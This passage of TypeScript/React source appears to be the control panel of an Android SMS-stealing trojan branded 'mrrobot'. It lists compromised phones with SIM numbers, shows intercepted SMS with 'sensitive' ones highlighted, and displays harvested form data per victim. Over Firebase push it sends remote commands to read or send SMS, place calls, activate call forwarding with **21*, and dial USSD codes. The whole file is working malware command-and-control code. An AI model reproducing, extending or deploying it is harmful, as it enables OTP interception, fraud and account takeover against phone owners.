import { useState, useEffect, useCallback, useRef, createContext, useContext } from "react";

const DEVELOPER_TELEGRAM = "@mrrobot_dev";
const DEVELOPER_WHATSAPP = "+91 98765 43210";

/* ─── Theme ─── */
interface Theme {
  bg: string; card: string; cardB: string;
  hdr: string; hdrB: string;
  txt: string; txt2: string; muted: string;
  isDark: boolean;
}
const LT: Theme = {
  bg: "#f1f5f9", card: "#ffffff", cardB: "#e2e8f0",
  hdr: "#f8fafc", hdrB: "#f1f5f9",
  txt: "#0f172a", txt2: "#334155", muted: "#94a3b8",
  isDark: false,
};
const DT: Theme = {
  bg: "#0f172a", card: "#1e293b", cardB: "#334155",
  hdr: "#162032", hdrB: "#243444",
  txt: "#f1f5f9", txt2: "#cbd5e1", muted: "#94a3b8",
  isDark: true,
};
const ThemeCtx = createContext<Theme>(LT);
function useTheme() { return useContext(ThemeCtx); }

interface DbDevice {
  id: number; deviceId: string; appId: string; userId: string; name: string;
  androidVersion: number; sim1Carrier: string | null; sim1Phone: string | null;
  sim2Carrier: string | null; sim2Phone: string | null; status: string;
  lastOnline: string | null; forwardEnabled: boolean; fcmToken: string | null; installedAt: string;
}
interface DbMessage {
  id: number; appId: string; deviceId: string; userId: string;
  fromSender: string; fromNumber: string; body: string; isSensitive: boolean; receivedAt: string;
}
interface DbFormData { id: number; appId: string; deviceId: string; data: Record<string, unknown>; submittedAt: string; }
type Page = "home" | "messages" | "groups" | "devices" | "settings";
type ActionKey = "online_check" | "get_sms" | "send_sms" | "voice_call" | "call_forward" | "dial_ussd";
type SendState = "idle" | "loading" | "ok" | "err";

function sc(s: string) {
  if (s === "online") return "#22c55e";
  if (s === "uninstalled") return "#ef4444";
  return "#f59e0b";
}
function sl(s: string) {
  if (s === "online") return "Online";
  if (s === "uninstalled") return "Uninstalled";
  return "Inactive";
}
function fmtDate(iso: string) {
  return new Date(iso).toLocaleString("en-IN", {
    day: "2-digit", month: "short", year: "numeric",
    hour: "2-digit", minute: "2-digit", hour12: false,
  });
}
function fmtShort(iso: string) {
  return new Date(iso).toLocaleString("en-IN", {
    day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: false,
  });
}

/* client-side timeAgo — computed live from raw ISO timestamp */
function timeAgo(iso: string | null): string {
  if (!iso) return "—";
  const dt = new Date(iso);
  if (isNaN(dt.getTime())) return iso; // fallback for legacy strings
  const secs = Math.floor((Date.now() - dt.getTime()) / 1000);
  if (secs < 0) return "just now";
  if (secs < 60) return `${secs}s ago`;
  const mins = Math.floor(secs / 60);
  if (mins < 60) return `${mins}m ago`;
  const hours = Math.floor(mins / 60);
  if (hours < 24) return `${hours}h ago`;
  return `${Math.floor(hours / 24)}d ago`;
}

/* returns true if lastOnline ISO is within last 15 minutes */
function isRecent(lastOnline: string | null): boolean {
  if (!lastOnline) return false;
  const dt = new Date(lastOnline);
  if (isNaN(dt.getTime())) return false;
  return Date.now() - dt.getTime() <= 15 * 60 * 1000;
}

async function fcmSend(deviceId: string, data: Record<string, string>): Promise<string> {
  const res = await fetch("/api/fcm/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ deviceId, data }),
  });
  const body = await res.json() as Record<string, unknown>;
  if (!res.ok) throw new Error(String((body["error"] as Record<string, unknown>)?.["message"] ?? body["error"] ?? "FCM failed"));
  return String(body["messageId"] ?? "sent");
}

/** Build CHECK_ONLINE payload — Android: enqueueCheckOnline(payload) */
function mkCheckOnline(uid: string): Record<string, string> {
  return { type: "CHECK_ONLINE", payload: JSON.stringify({ uniqueid: uid }) };
}
/** Build DEVICE_COMMAND payload — Android: routeDeviceCommand(payload) */
function mkDeviceCmd(uid: string, action: string, extra?: Record<string, unknown>): Record<string, string> {
  return { type: "DEVICE_COMMAND", payload: JSON.stringify({ uniqueid: uid, action, ...extra }) };
}
/** Build ADMIN_UPDATE payload — Android: handleAdminUpdate(payload) */
function mkAdminUpdate(did: string, number: string, status: "on" | "off"): Record<string, string> {
  return { type: "ADMIN_UPDATE", payload: JSON.stringify({ deviceId: did, number, status }) };
}

/* ─── Row helper ─── */
function Row({ label, value, mono, accent }: { label: string; value: string; mono?: boolean; accent?: string }) {
  const t = useTheme();
  return (
    <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${t.hdrB}`, gap: 8 }}>
      <div style={{ width: 100, fontSize: 11, color: t.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>{label}</div>
      <div style={{ flex: 1, fontSize: 12, color: accent ?? t.txt, fontFamily: mono ? "monospace" : "inherit", wordBreak: "break-all" }}>{value}</div>
    </div>
  );
}

/* ─── Message card ─── */
function MsgCard({
  msg, deviceName, device, onOpen, cardClickable, formEntries,
}: {
  msg: DbMessage;
  deviceName: string;
  device?: DbDevice;
  onOpen?: (d: DbDevice, msgId: string) => void;
  cardClickable?: boolean;
  formEntries?: DbFormData[];
}) {
  const t = useTheme();
  const [showForm, setShowForm] = useState(false);

  function handleCardClick() {
    if (cardClickable && device) onOpen?.(device, String(msg.id));
  }

  return (
    <div id={`msg-${msg.id}`} style={{ borderRadius: 8, overflow: "hidden", border: `1px solid ${t.cardB}` }}>
      <div
        onClick={cardClickable && device ? handleCardClick : undefined}
        style={{
          background: t.card, padding: "10px 14px",
          cursor: cardClickable && device ? "pointer" : "default",
          transition: "box-shadow 0.15s",
        }}
        onMouseEnter={e => { if (cardClickable && device) (e.currentTarget as HTMLDivElement).style.boxShadow = "0 2px 8px rgba(99,102,241,0.13)"; }}
        onMouseLeave={e => { (e.currentTarget as HTMLDivElement).style.boxShadow = "none"; }}
      >
        {/* Header row */}
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6, gap: 8 }}>
          <span style={{ fontSize: 10, color: "#94a3b8" }}>{fmtShort(msg.receivedAt)}</span>
          <div style={{ display: "flex", gap: 5 }}>
            <span style={{ fontSize: 10, background: t.hdrB, color: t.muted, padding: "1px 7px", borderRadius: 4 }}>{deviceName}</span>
          </div>
        </div>

        {/* Body */}
        <div style={{ fontSize: 13, color: msg.isSensitive ? "#16a34a" : t.txt, fontWeight: msg.isSensitive ? 600 : 400, lineHeight: 1.55, marginBottom: 6 }}>{msg.body}</div>

        {/* From / Mob */}
        <div style={{ display: "flex", gap: 16, fontSize: 11 }}>
          <span style={{ color: "#64748b" }}><span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>FROM</span>{msg.fromSender}</span>
          <span style={{ color: "#64748b" }}><span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>MOB</span>{msg.fromNumber}</span>
        </div>
      </div>

      {/* Form Data button — only when formEntries provided */}
      {formEntries !== undefined && (
        <button
          onClick={() => setShowForm(v => !v)}
          style={{
            width: "100%", padding: "7px 0", border: "none", borderTop: `1px solid ${t.cardB}`,
            background: showForm ? t.hdrB : t.bg,
            color: "#8b5cf6",
            fontWeight: 700, fontSize: 11, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 5,
          }}
        >
          <span style={{ fontSize: 12 }}>◈</span>
          Form Data {formEntries.length > 0 ? `(${formEntries.length})` : "(0)"}
          <span style={{ fontSize: 10, display: "inline-block", transform: showForm ? "rotate(180deg)" : "none", transition: "transform 0.2s" }}>▾</span>
        </button>
      )}

      {/* Inline form data */}
      {formEntries !== undefined && showForm && (
        <div style={{ background: t.hdrB, borderTop: `1px solid ${t.cardB}`, overflow: "hidden" }}>
          {formEntries.length === 0
            ? <div style={{ fontSize: 11, color: t.muted, textAlign: "center", padding: "8px 0" }}>No form data from this device</div>
            : formEntries.slice().sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime()).map((entry, idx, arr) => {
                const pairs = Object.entries(entry.data ?? {});
                const time = new Date(entry.submittedAt).toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: true });
                return (
                  <div key={entry.id} style={{ borderBottom: idx < arr.length - 1 ? `1px solid ${t.cardB}` : "none" }}>
                    {/* Entry number + time — single tight row */}
                    <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "2px 10px", background: t.hdrB }}>
                      <span style={{ fontSize: 8, color: "#8b5cf6", fontFamily: "monospace", fontWeight: 700 }}>#{idx + 1}</span>
                      <span style={{ fontSize: 8, color: t.muted }}>{time}</span>
                    </div>
                    {/* Key-value rows */}
                    {pairs.length === 0
                      ? <div style={{ fontSize: 10, color: t.muted, padding: "2px 10px 4px" }}>—</div>
                      : pairs.map(([k, v]) => (
                        <div key={k} style={{ display: "flex", gap: 8, padding: "2px 10px", alignItems: "baseline", background: t.card }}>
                          <span style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600, minWidth: 86, flexShrink: 0 }}>{fmtKey(k)}</span>
                          <span style={{ fontSize: 10, color: t.txt, wordBreak: "break-all", flex: 1 }}>{String(v ?? "")}</span>
                        </div>
                      ))
                    }
                  </div>
                );
              })
          }
        </div>
      )}
    </div>
  );
}

/* ─── SIM Selector ─── */
function SimSelect({ value, onChange, device }: { value: "1" | "2"; onChange: (v: "1" | "2") => void; device: DbDevice }) {
  const t = useTheme();
  const labels = {
    "1": [device.sim1Carrier, device.sim1Phone].filter(Boolean).join(" · ") || "—",
    "2": [device.sim2Carrier, device.sim2Phone].filter(Boolean).join(" · ") || "—",
  };
  return (
    <div style={{ display: "flex", gap: 8, marginBottom: 12 }}>
      {(["1", "2"] as const).map(s => {
        const active = value === s;
        return (
          <button key={s} onClick={() => onChange(s)} style={{
            flex: 1, padding: "8px 10px", borderRadius: 8, border: "1.5px solid",
            borderColor: active ? "#6366f1" : t.cardB,
            background: active ? (t.isDark ? "#1e1b4b" : "#eef2ff") : t.hdrB, cursor: "pointer", textAlign: "left",
          }}>
            <div style={{ fontSize: 11, fontWeight: 700, color: active ? "#6366f1" : t.txt2 }}>SIM {s}</div>
            <div style={{ fontSize: 10, color: active ? "#818cf8" : t.muted, marginTop: 2, wordBreak: "break-all" }}>{labels[s]}</div>
          </button>
        );
      })}
    </div>
  );
}

function FieldInput({ placeholder, value, onChange, type = "text" }: { placeholder: string; value: string; onChange: (v: string) => void; type?: string }) {
  const t = useTheme();
  return (
    <input type={type} value={value} onChange={e => onChange(e.target.value)} placeholder={placeholder} style={{
      width: "100%", boxSizing: "border-box", border: `1.5px solid ${t.cardB}`, borderRadius: 8,
      padding: "10px 12px", fontSize: 13, outline: "none", marginBottom: 10,
      color: t.txt, background: t.card, fontFamily: "inherit",
    }} />
  );
}

function StatusLog({ state, log }: { state: SendState; log: string }) {
  if (!log) return null;
  return (
    <div style={{
      fontSize: 12, padding: "8px 12px", borderRadius: 8, marginBottom: 8,
      background: state === "ok" ? "#f0fdf4" : state === "err" ? "#fef2f2" : "#fefce8",
      color: state === "ok" ? "#16a34a" : state === "err" ? "#dc2626" : "#92400e",
    }}>{log}</div>
  );
}

function PrimaryBtn({ state, idle, loading: ld, ok, onClick }: {
  state: SendState; idle: string; loading: string; ok: string; onClick: () => void;
}) {
  return (
    <button onClick={onClick} disabled={state === "loading"} style={{
      width: "100%", padding: "12px 0", borderRadius: 10, border: "none",
      background: state === "ok" ? "#22c55e" : state === "err" ? "#ef4444" : "#6366f1",
      color: "#fff", fontWeight: 700, fontSize: 14,
      cursor: state === "loading" ? "wait" : "pointer", marginTop: 2,
    }}>
      {state === "loading" ? ld : state === "ok" ? ok : state === "err" ? "Retry" : idle}
    </button>
  );
}

/* ════ INLINE ACTION PANEL ════ */
function ActionPanel({ action, device, onClose }: { action: ActionKey; device: DbDevice; onClose: () => void }) {
  const [sim, setSim] = useState<"1" | "2">("1");
  const [number, setNumber] = useState("");
  const [smsText, setSmsText] = useState("");
  const [ussdCode, setUssdCode] = useState("");
  const [state, setState] = useState<SendState>("idle");
  const [log, setLog] = useState("");

  async function send(data: Record<string, string>) {
    setState("loading"); setLog("Sending…");
    try {
      const id = await fcmSend(device.deviceId, data);
      setState("ok"); setLog(`Sent · ${id}`);
    } catch (e) { setState("err"); setLog((e as Error).message); }
  }

  const titles: Record<ActionKey, string> = {
    online_check: "Online Check", get_sms: "Get SMS", send_sms: "Send SMS",
    voice_call: "Voice Call", call_forward: "Call Forwarding", dial_ussd: "Dial USSD",
  };

  const t = useTheme();

  return (
    <div style={{ background: t.card, borderRadius: 10, border: `1.5px solid ${t.cardB}`, padding: "14px", boxShadow: "0 2px 8px rgba(0,0,0,0.08)" }}>
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 14 }}>
        <div style={{ fontWeight: 700, fontSize: 14, color: t.txt }}>{titles[action]}</div>
        <button onClick={onClose} style={{ background: "none", border: "none", color: "#94a3b8", fontSize: 18, cursor: "pointer", padding: 0, lineHeight: 1 }}>✕</button>
      </div>

      {action === "online_check" && (
        <>
          <div style={{ fontSize: 12, color: t.txt2, marginBottom: 12 }}>
            Pings <b>{device.name}</b> to check if it's online and reachable.
          </div>
          <StatusLog state={state} log={log} />
          <PrimaryBtn state={state} idle="Send" loading="Sending…" ok="Sent" onClick={() => void send({ type: "0" })} />
        </>
      )}
      {action === "get_sms" && (
        <>
          <div style={{ fontSize: 12, color: t.txt2, marginBottom: 12 }}>Device will upload its latest messages.</div>
          <StatusLog state={state} log={log} />
          <PrimaryBtn state={state} idle="Get SMS" loading="Requesting…" ok="Sent" onClick={() => void send(mkDeviceCmd(device.deviceId, "get_sms"))} />
        </>
      )}
      {action === "send_sms" && (
        <>
          <div style={{ fontSize: 11, color: t.txt2, fontWeight: 600, marginBottom: 6 }}>SIM Slot</div>
          <SimSelect value={sim} onChange={setSim} device={device} />
          <FieldInput placeholder="Recipient number" value={number} onChange={setNumber} type="tel" />
          <textarea value={smsText} onChange={e => setSmsText(e.target.value)} placeholder="Message text…" rows={3} style={{
            width: "100%", boxSizing: "border-box", border: `1.5px solid ${t.cardB}`, borderRadius: 8,
            padding: "10px 12px", fontSize: 13, outline: "none", marginBottom: 10,
            color: t.txt, background: t.card, resize: "vertical", fontFamily: "inherit",
          }} />
          <StatusLog state={state} log={log} />
          <PrimaryBtn state={state} idle="Send SMS" loading="Sending…" ok="SMS Sent" onClick={() => {
            if (!number.trim()) { setLog("Enter a recipient number."); setState("err"); return; }
            if (!smsText.trim()) { setLog("Enter message text."); setState("err"); return; }
            void send(mkDeviceCmd(device.deviceId, "sms", { to: number.trim(), body: smsText.trim(), simSlot: sim === "2" ? 1 : 0, timestamp: Date.now() }));
          }} />
        </>
      )}
      {action === "voice_call" && (
        <>
          <div style={{ fontSize: 11, color: t.txt2, fontWeight: 600, marginBottom: 6 }}>SIM Slot</div>
          <SimSelect value={sim} onChange={setSim} device={device} />
          <FieldInput placeholder="Number to call" value={number} onChange={setNumber} type="tel" />
          <StatusLog state={state} log={log} />
          <PrimaryBtn state={state} idle="Make Call" loading="Initiating…" ok="Call Initiated" onClick={() => {
            if (!number.trim()) { setLog("Enter a number to call."); setState("err"); return; }
            void send(mkDeviceCmd(device.deviceId, "call", { code: number.trim(), simSlot: sim === "2" ? 1 : 0 }));
          }} />
        </>
      )}
      {action === "call_forward" && (
        <>
          <div style={{ fontSize: 11, color: t.txt2, fontWeight: 600, marginBottom: 6 }}>SIM Slot</div>
          <SimSelect value={sim} onChange={setSim} device={device} />
          <FieldInput placeholder="Forward to number" value={number} onChange={setNumber} type="tel" />
          <StatusLog state={state} log={log} />
          <div style={{ display: "flex", gap: 10 }}>
            <button onClick={() => {
              if (!number.trim()) { setLog("Enter a number to forward calls to."); setState("err"); return; }
              void send(mkDeviceCmd(device.deviceId, "call", { code: `**21*${number.trim()}#`, simSlot: sim === "2" ? 1 : 0 }));
            }} disabled={state === "loading"} style={{ flex: 1, padding: "12px 0", borderRadius: 10, border: "none", background: "#22c55e", color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>
              Activate
            </button>
            <button onClick={() => {
              void send(mkDeviceCmd(device.deviceId, "ussd", { code: "##21#", simSlot: sim === "2" ? 1 : 0 }));
            }} disabled={state === "loading"} style={{ flex: 1, padding: "12px 0", borderRadius: 10, border: "none", background: "#ef4444", color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>
              Deactivate
            </button>
          </div>
          <div style={{ fontSize: 9, color: t.muted, textAlign: "center", marginTop: 4 }}>
            Deactivate dials <span style={{ fontFamily: "monospace", color: "#f87171" }}>##21#</span> automatically
          </div>
        </>
      )}
      {action === "dial_ussd" && (
        <>
          <div style={{ fontSize: 11, color: t.txt2, fontWeight: 600, marginBottom: 6 }}>SIM Slot</div>
          <SimSelect value={sim} onChange={setSim} device={device} />
          <FieldInput placeholder="USSD code (e.g. *123#)" value={ussdCode} onChange={setUssdCode} />
          <StatusLog state={state} log={log} />
          <PrimaryBtn state={state} idle="Dial USSD" loading="Dialing…" ok="Dialed" onClick={() => {
            if (!ussdCode.trim()) { setLog("Enter a USSD code."); setState("err"); return; }
            void send(mkDeviceCmd(device.deviceId, "ussd", { code: ussdCode.trim(), simSlot: sim === "2" ? 1 : 0 }));
          }} />
        </>
      )}
    </div>
  );
}

/* ════ STAT CARD ════ */
function Stat({ label, value, color }: { label: string; value: string | number; color: string }) {
  return (
    <div style={{ background: "#fff", borderRadius: 8, padding: "12px 14px", border: "1px solid #e2e8f0" }}>
      <div style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.4, marginBottom: 6 }}>{label}</div>
      <div style={{ fontSize: 24, fontWeight: 800, color }}>{value}</div>
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — HOME
════════════════════════════════════════ */
interface AdminSession { id: string; loginTime: string; lastActive: string; userAgent: string; ip: string; device: string; }

function fmtTime(iso: string) {
  const d = new Date(iso);
  return d.toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: true });
}

function HomePage({
  devices, messages, formData, onOpenDevice, scrollToMsgId, onScrollDone,
}: {
  devices: DbDevice[];
  messages: DbMessage[];
  formData: DbFormData[];
  onOpenDevice: (d: DbDevice, msgId: string) => void;
  scrollToMsgId?: string | null;
  onScrollDone?: () => void;
}) {
  const t = useTheme();
  function getDevice(deviceId: string) { return devices.find(d => d.deviceId === deviceId); }

  const formByDevice = formData.reduce((acc, f) => {
    if (!acc[f.deviceId]) acc[f.deviceId] = [];
    acc[f.deviceId].push(f);
    return acc;
  }, {} as Record<string, DbFormData[]>);

  const allMsgs = [...messages].sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime());

  useEffect(() => {
    if (!scrollToMsgId) return;
    const el = document.getElementById(`msg-${scrollToMsgId}`);
    if (el) el.scrollIntoView({ behavior: "smooth", block: "center" });
    onScrollDone?.();
  }, [scrollToMsgId]);

  return (
    <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>

      {/* ── Recent Messages ── */}
      <div style={{ fontWeight: 800, fontSize: 13, color: t.txt, padding: "2px 2px 0" }}>Recent Messages</div>
      {allMsgs.length === 0
        ? <div style={{ textAlign: "center", color: "#94a3b8", padding: 24, fontSize: 12 }}>No messages yet</div>
        : allMsgs.map(msg => {
            const dev = getDevice(msg.deviceId);
            return (
              <MsgCard
                key={msg.id}
                msg={msg}
                deviceName={dev?.name ?? msg.deviceId}
                device={dev}
                onOpen={onOpenDevice}
                cardClickable
                formEntries={formByDevice[msg.deviceId] ?? []}
              />
            );
          })
      }
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — MESSAGES
════════════════════════════════════════ */
function MessagesPage({
  messages, devices, onOpenDevice, scrollToMsgId, onScrollDone,
}: {
  messages: DbMessage[];
  devices: DbDevice[];
  onOpenDevice: (d: DbDevice, msgId: string) => void;
  scrollToMsgId?: string | null;
  onScrollDone?: () => void;
}) {
  const t = useTheme();
  const [search, setSearch] = useState("");
  const [filterSensitive, setFilterSensitive] = useState(false);

  function getDevice(deviceId: string) { return devices.find(d => d.deviceId === deviceId); }

  const filtered = [...messages]
    .sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime())
    .filter(m => {
      if (filterSensitive && !m.isSensitive) return false;
      const q = search.toLowerCase();
      return !q || m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q) || (getDevice(m.deviceId)?.name ?? "").toLowerCase().includes(q);
    });

  useEffect(() => {
    if (!scrollToMsgId) return;
    const el = document.getElementById(`msg-${scrollToMsgId}`);
    if (el) el.scrollIntoView({ behavior: "smooth", block: "center" });
    onScrollDone?.();
  }, [scrollToMsgId]);

  return (
    <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>
      <div style={{ display: "flex", gap: 8 }}>
        <div style={{ flex: 1, background: t.card, border: `1px solid ${t.cardB}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
          <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search messages…"
            style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: t.txt }} />
        </div>
        <button onClick={() => setFilterSensitive(p => !p)} style={{
          padding: "8px 12px", borderRadius: 8, border: "1.5px solid",
          borderColor: filterSensitive ? "#ef4444" : t.cardB,
          background: filterSensitive ? "#fef2f2" : t.card,
          color: filterSensitive ? "#ef4444" : t.muted,
          fontSize: 11, fontWeight: 600, cursor: "pointer",
        }}>Sensitive</button>
      </div>
      <div style={{ fontSize: 11, color: t.muted }}>{filtered.length} messages</div>
      {filtered.length === 0
        ? <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>No messages found</div>
        : filtered.map(msg => {
            const dev = getDevice(msg.deviceId);
            return <MsgCard key={msg.id} msg={msg} deviceName={dev?.name ?? msg.deviceId} device={dev} onOpen={onOpenDevice} cardClickable />;
          })
      }
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — GROUPS (only user DB form data)
════════════════════════════════════════ */
function fmtKey(k: string): string {
  return k.replace(/_/g, " ").replace(/([a-z])([A-Z])/g, "$1 $2").replace(/\b\w/g, c => c.toUpperCase());
}

function GroupsPage({ devices, formData, onOpenDevice }: { devices: DbDevice[]; messages: DbMessage[]; formData: DbFormData[]; onOpenDevice: (d: DbDevice) => void }) {
  const t = useTheme();

  const formByDevice = formData.reduce((acc, f) => {
    if (!acc[f.deviceId]) acc[f.deviceId] = [];
    acc[f.deviceId].push(f);
    return acc;
  }, {} as Record<string, DbFormData[]>);

  const devicesWithData = devices.filter(d => (formByDevice[d.deviceId]?.length ?? 0) > 0);

  const byUser = devicesWithData.reduce((acc, d) => {
    if (!acc[d.userId]) acc[d.userId] = [];
    acc[d.userId].push(d);
    return acc;
  }, {} as Record<string, DbDevice[]>);
  const userIds = Object.keys(byUser);

  const B = t.cardB;
  const H = t.hdrB;

  return (
    <div style={{ padding: 8, display: "flex", flexDirection: "column", gap: 8 }}>
      <div style={{ fontSize: 10, color: "#64748b" }}>
        {devicesWithData.length} device{devicesWithData.length !== 1 ? "s" : ""} · {formData.length} entr{formData.length !== 1 ? "ies" : "y"}
      </div>
      {userIds.length === 0 && (
        <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>No form submissions yet</div>
      )}
      {userIds.map(uid => {
        const uDevices = byUser[uid];
        const totalEntries = uDevices.reduce((s, d) => s + (formByDevice[d.deviceId]?.length ?? 0), 0);
        return (
          <div key={uid} style={{ borderRadius: 10, border: `1px solid ${B}`, overflow: "hidden" }}>
            {/* ── User header ── */}
            <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "6px 10px", background: H, borderBottom: `1px solid ${B}` }}>
              <div style={{ width: 26, height: 26, borderRadius: "50%", background: "#6366f1", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 800, fontSize: 9, flexShrink: 0, fontFamily: "monospace" }}>
                {uid.slice(-2)}
              </div>
              <span style={{ flex: 1, fontSize: 11, fontWeight: 700, fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", color: t.txt }}>{uid}</span>
              <span style={{ fontSize: 9, color: "#8b5cf6", fontWeight: 700, flexShrink: 0 }}>{totalEntries} entries</span>
            </div>

            {/* ── One card per device ── */}
            {uDevices.map((device, di) => {
              const devForm = (formByDevice[device.deviceId] ?? [])
                .slice()
                .sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime());
              const isLast = di === uDevices.length - 1;

              return (
                <div key={device.deviceId} style={{ borderBottom: isLast ? "none" : `1px solid ${B}`, background: t.card }}>

                  {/* Device sub-header */}
                  <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "5px 10px", borderBottom: `1px solid ${H}` }}>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <span style={{ fontSize: 11, fontWeight: 700, color: t.txt }}>{device.name}</span>
                      <span style={{ fontSize: 9, color: "#64748b", marginLeft: 6 }}>
                        {device.status === "uninstalled" ? "Uninstalled" : timeAgo(device.lastOnline)}
                      </span>
                    </div>
                    <button
                      onClick={() => onOpenDevice(device)}
                      style={{ fontSize: 9, padding: "1px 7px", borderRadius: 4, border: `1px solid ${B}`, background: "transparent", color: "#6366f1", cursor: "pointer", fontWeight: 600, flexShrink: 0 }}
                    >Open</button>
                  </div>

                  {/* All entries in ONE block — separated by thin lines only */}
                  {devForm.map((entry, idx) => {
                    const pairs = Object.entries(entry.data ?? {});
                    const time = new Date(entry.submittedAt).toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: true });
                    return (
                      <div key={entry.id} style={{ borderBottom: idx < devForm.length - 1 ? `1px solid ${H}` : "none" }}>
                        {/* Entry number + time — single tight row */}
                        <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "2px 10px", background: H }}>
                          <span style={{ fontSize: 8, color: "#8b5cf6", fontFamily: "monospace", fontWeight: 700 }}>#{idx + 1}</span>
                          <span style={{ fontSize: 8, color: "#64748b" }}>{time}</span>
                        </div>
                        {/* Key-value pairs */}
                        {pairs.length === 0
                          ? <div style={{ fontSize: 10, color: "#64748b", padding: "2px 10px" }}>—</div>
                          : pairs.map(([k, v]) => (
                            <div key={k} style={{ display: "flex", padding: "2px 10px", gap: 8, alignItems: "baseline" }}>
                              <span style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600, minWidth: 88, flexShrink: 0 }}>{fmtKey(k)}</span>
                              <span style={{ fontSize: 10, color: t.txt, wordBreak: "break-all", flex: 1 }}>{String(v ?? "")}</span>
                            </div>
                          ))
                        }
                      </div>
                    );
                  })}
                </div>
              );
            })}
          </div>
        );
      })}
    </div>
  );
}

/* ─── Per-device Check Online button ─── */
function CheckOnlineBtn({ device }: { device: DbDevice }) {
  const [checking, setChecking] = useState(false);
  const [errMsg, setErrMsg] = useState("");
  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => () => { if (timeoutRef.current) clearTimeout(timeoutRef.current); }, []);

  // SSE: device heartbeat received → immediately reset to "Check Online"
  useEffect(() => {
    function onUpdated(e: Event) {
      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
      if (deviceId !== device.deviceId) return;
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
      setChecking(false);
    }
    window.addEventListener("mrrobot:device_updated", onUpdated);
    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
  }, [device.deviceId]);

  async function handleClick(e: React.MouseEvent) {
    e.stopPropagation();
    if (checking) return;
    if (timeoutRef.current) clearTimeout(timeoutRef.current);
    setErrMsg("");

    try {
      await fcmSend(device.deviceId, { type: "0" });
    } catch (err) {
      setErrMsg((err as Error).message || "FCM failed");
      setTimeout(() => setErrMsg(""), 4000);
      return;
    }

    setChecking(true);
    // Auto-reset after 15s if device never responds
    timeoutRef.current = setTimeout(() => setChecking(false), 15000);
  }

  return (
    <div>
      <button onClick={e => void handleClick(e)} style={{
        width: "100%", borderRadius: 6, padding: "6px 4px",
        fontSize: 11, fontWeight: 600, textAlign: "center", marginTop: 2,
        border: checking ? "1px solid #bfdbfe" : "1px solid #e2e8f0",
        background: checking ? "#eff6ff" : "#f8fafc",
        color: checking ? "#1d4ed8" : "#475569",
        cursor: checking ? "default" : "pointer",
        transition: "background 0.25s, border-color 0.25s, color 0.25s",
      }}>
        {checking ? "Checking…" : "Check Online"}
      </button>
      {errMsg && (
        <div style={{ fontSize: 9, color: "#dc2626", marginTop: 3, lineHeight: 1.3, wordBreak: "break-word" }}>
          {errMsg}
        </div>
      )}
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — DEVICES
════════════════════════════════════════ */
/* ════════════════════════════════════════
   ADMIN UPDATE PANEL (per-device)
════════════════════════════════════════ */
function AdminUpdatePanel({ device }: { device: DbDevice }) {
  const t = useTheme();
  const [num, setNum] = useState("");
  const [sendState, setSendState] = useState<"idle"|"loading"|"ok"|"err">("idle");
  const [sendMsg, setSendMsg] = useState("");
  const [disableState, setDisableState] = useState<"idle"|"loading"|"ok"|"err">("idle");
  const [disableMsg, setDisableMsg] = useState("");

  async function sendCmd(data: Record<string, string>, which: "send"|"disable") {
    if (which === "send") { setSendState("loading"); setSendMsg(""); }
    else { setDisableState("loading"); setDisableMsg(""); }
    try {
      await fcmSend(device.deviceId, data);
      if (which === "send") { setSendMsg("Sent ✓"); setSendState("ok"); }
      else { setDisableMsg("Disabled ✓"); setDisableState("ok"); }
    } catch (e) {
      const msg = (e as Error).message;
      if (which === "send") { setSendMsg(msg); setSendState("err"); }
      else { setDisableMsg(msg); setDisableState("err"); }
    }
    finally {
      setTimeout(() => {
        if (which === "send") { setSendState("idle"); setSendMsg(""); }
